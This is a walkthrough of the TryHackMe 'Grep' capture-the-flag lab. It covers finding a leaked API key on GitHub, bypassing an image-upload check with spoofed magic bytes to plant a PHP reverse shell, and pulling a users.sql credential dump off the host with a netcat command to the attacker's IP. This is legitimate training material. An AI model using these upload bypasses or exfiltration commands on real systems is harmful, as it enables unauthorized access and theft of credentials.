# Grep CTF Walkthrough
<br/>

## Intro
Welcome into the Grep challenge, here is the link of the [room](https://tryhackme.com/room/greprtp) on TryHackMe.

Here is the story-context:
"In this task, you will be an ethical hacker aiming to exploit a newly developed web application.

SuperSecure Corp, a fast-paced startup, is currently creating a blogging platform inviting security professionals to assess its security. The challenge involves using OSINT techniques to gather information from publicly accessible sources and exploit potential vulnerabilities in the web application.

Your goal is to identify and exploit vulnerabilities in the application using a combination of recon and OSINT skills. As you progress, you’ll look for weak points in the app, find sensitive data, and attempt to gain unauthorized access. You will leverage the skills and knowledge acquired through the Red Team Pathway to devise and execute your attack strategies."

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's Begin !

<br/>
<br/>

## The Challenge
Let's begin by adding the domain to the hosts file
```bash
echo "10.10.228.221  grep.thm" | sudo tee -a /etc/hosts
```

Do a port scan :
```bash
rustscan -a grep.thm  --ulimit 5000 -- -sV
```

It detects 4 open ports:
```
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
443/tcp   open  ssl/http syn-ack ttl 63 Apache httpd 2.4.41
51337/tcp open  http     syn-ack ttl 63 Apache httpd 2.4.41
```

Let's take a look at the website at `https://grep.thm/`.
We can see there is a register page, if we  try to register a new user we get error "Invalid API Key".

Since the website is under development and this is an OSINT challenge let's search if they created a page on GitHub.
We can find a repository called "supersecuredeveloper/searchmecms" which contains a directory with the `register.php` file, looking at the commit history we land `https://github.com/supersecuredeveloper/searchmecms/commit/db11421db2324ed0991c36493a725bf7db9bdcf6` and find out that on the first commit someone exposed the API key.
--> REDACTED

Looking at the code we can also see that we will need to pass the key with the `X-THM-API-Key` header.

Now that we have it we can interact with the register page.
Send the register request, capture it with Burp Suite Proxy and add the API key then forward it.

The registration this time is successful and we can use the credentials to login.
On the dashboard we find the first flag:
--> REDACTED

In the repo we have also seen that there is an `upload.php` where guess what, we can upload a file.
Here is the code:
```php
<?php
session_start();
require 'config.php';
$uploadPath = 'uploads/';

function checkMagicBytes($fileTmpPath, $validMagicBytes) {
    $fileMagicBytes = file_get_contents($fileTmpPath, false, null, 0, 4);
    return in_array(bin2hex($fileMagicBytes), $validMagicBytes);
}

$allowedExtensions = ['jpg', 'jpeg', 'png', 'bmp'];
$validMagicBytes = [
    'jpg' => 'ffd8ffe0', 
    'png' => '89504e47', 
    'bmp' => '424d'
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_SESSION['username'])) {
        if (isset($_FILES['file'])) {
            $file = $_FILES['file'];
            $fileName = $file['name'];
            $fileTmpPath = $file['tmp_name'];
            $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

            if (checkMagicBytes($fileTmpPath, $validMagicBytes)) {
                $uploadDestination = $uploadPath . $fileName;
                move_uploaded_file($fileTmpPath, $uploadDestination);

                echo json_encode(['message' => 'File uploaded successfully.']);
            } else {
                echo json_encode(['error' => 'Invalid file type. Only JPG, JPEG, PNG, and BMP files are allowed.']);
            }
        } else {
            echo json_encode(['error' => 'No file uploaded.']);
        }
    } else {
        echo json_encode(['error' => 'User not logged in.']);
    }
} else {
    echo json_encode(['error' => 'Unsupported request method.']);
}
?>
```

We can see that the uploaded files will be saved to `/api/uploads`.
Also there is a very simple filtering, basically it checks for the magic number of the file/extension to ensure that you could not send a malicious file disguised as an image... 

This in theory, practically we can just include the magic number editing the hex of the file and then paste inside a reverse shell.
Should word, let's set this up, choose a reverse shell payload, i went for the PentestMonkey PHP reverse shell.
1. Save it in a file called `shell.php`.
2. Adding the magic number will overwrite some bytes so open the file with a text editor ad prepend something useless like `1234`
3. Now let's add the magic bytes `ffd8ffe0`: 
```bash
hexedit shell.php
```

At this point we upload the file and get the message `{"message":"File uploaded successfully."}`.

Prepare a listener on your machine to receive the connection:
```bash
nc -lvnp 1234
```

Now visit `https://grep.thm/api/uploads/` and click on the shell file, this will trigger the reverse shell.

We now have a shell as the user "www-data".
We can upgrade our shell (i made a guide [here]() on how to do it)

<br/>

### Privilege Escalation
Let's now navigate to the directory where we usually find the website content:
```bash
cd /var/wwww/
ls -la
```

We can see a Backup directory which is also interesting because was created by the user "ubuntu", probably our next target.
Inside there is a file called `users.sql`, let's transfer it to our machine:

```bash
nc -lvnp 4444 > users.sql
```

On target:
```bash
nc -nv 10.11.136.136 4444 < users.sql
```

Now we view the content:
```bash
strings users.sql
```

There is a set of credentials:
```
(1, 'test', '$2y$10$dE6VAd....', 'test@grep.thm', 'Test User', 'user'),
(2, 'admin', '$2y$10$3V62f66VxzdTz......REDACTED', 'a......REDACTED'
```

This also contains the answer to the admin email question:
--> REDACTED

And this shows a new subdomain, add it to our hosts file `searchme2023cms.grep.thm` just in case.

Trying to crack the password was tempting but probably not our path in this OSINT challenge, let's wait a moment.

In the `/var/www` there was also a directory we had no access to about a leak-checker website, the directory name is `leakcheker`, we can suppose that is probably on a sudbomai, try to add `leakchecker.grep.thm` to the hosts file.
Probably is hosted on the last port (`51337`) we have discovered at the beginning.

Let's try to visit it with the new domain `http://leakchecker.grep.thm:51337`

It works we are now on the leak checker website and can submit an email for the search, of course we do it for the admin one.
This shows us the password:
--> REDACTED

And this challenge actually ends here.

<br/>
<br/>

## Conclusion
Congratulations you have successfully practiced with some OSINT, exploited a web API via file upload to gain initial access and finally dumped an SQL database containing some credentials.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
